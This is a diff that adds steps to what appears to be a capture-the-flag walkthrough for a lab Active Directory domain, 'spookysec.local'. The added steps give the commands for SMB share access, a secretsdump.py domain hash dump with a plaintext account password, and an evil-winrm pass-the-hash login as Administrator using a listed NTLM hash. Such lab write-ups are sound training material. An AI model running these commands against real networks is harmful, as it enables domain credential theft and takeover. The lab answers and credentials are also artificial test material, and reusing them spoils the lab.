@@ -134,6 +134,62 @@ smbclient -L TARGET IP -U spookysec.local/svc-admin%management2005
 
 
 
+Now that we have the list of shares. Let's try and connect to each of them and see if we find anything interesting.
+
+Run the following command.
+
+```
+smbclient //TARGET IP/ADMIN$ -U svc-admin
+```
+For the first share we get an access denied. Let's try the second one. 
+
+
+We can access the second share with an interesting txt file. Use 'more' to view the content of the file. With this information we can answer questions four and five.
+
+Copy the string, throw it in CyberChef, and use the Magic function to decode it.
+
+
+## Domain Privilege Escalation - Elvating Privileges within the Domain
+
+
+
+
+Questions
+1. What method allowed us to dump NTDS.DIT?
+2. What is the Administrators NTLM hash?
+3. What method of attack could allow us to authenticate as the user without the password?
+4. Using a tool called Evil-WinRM what option will allow us to use a hash?
+
+
+The intro mentions to use secretsdump.py to retrieve password hashes. 
+
+Run the following command to get the hashes and the answers to questions one and two.
+
+```
+python3 impacket/examples/secretsdump.py -just-dc spookysec.local/backup:backup251786@TARGET IP
+```
+
+The answer to question 3 is pretty easy, if you don't know copy and paste it into Google.
+
+Question four is asking us to use Evil-WinRM. Use the '-h' option to list the available features or go to the following webpage to get a detailed guide https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/ and the answer to the question. 
+
+
+## Flag Submission 
+
+Run the following command to execute the pass the hash attack and connect to the remote host. 
+
+```
+evil-winrm -i TARGET IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+```
+From here navigate through the directory to find and submit the flags.
+
+
+
+
+
+
+
+
 
 
 
